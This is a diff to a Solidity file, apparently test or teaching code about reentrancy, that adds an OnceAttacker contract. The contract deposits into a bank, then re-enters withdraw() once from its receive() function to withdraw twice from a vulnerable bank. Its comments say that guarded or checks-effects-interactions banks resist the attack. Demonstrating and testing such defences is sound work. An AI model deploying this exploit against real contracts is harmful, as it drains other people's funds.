@@ -76,3 +76,22 @@ contract Attacker {
         if (msg.sender.balance >= msg.value) IBank(msg.sender).withdraw();
     }
 }
+
+/// @notice An attacker that re-enters `withdraw()` exactly once (a storage flag stops the
+/// recursion), so the exploit stays shallow. Against `VulnerableBank` one re-entry already
+/// withdraws twice; against `CEIBank`/`GuardedBank` the re-entry withdraws zero or reverts.
+contract OnceAttacker {
+    bool private entered;
+
+    function attack(IBank bank) external payable {
+        bank.deposit{value: msg.value}();
+        bank.withdraw();
+    }
+
+    receive() external payable {
+        if (!entered) {
+            entered = true;
+            IBank(msg.sender).withdraw();
+        }
+    }
+}
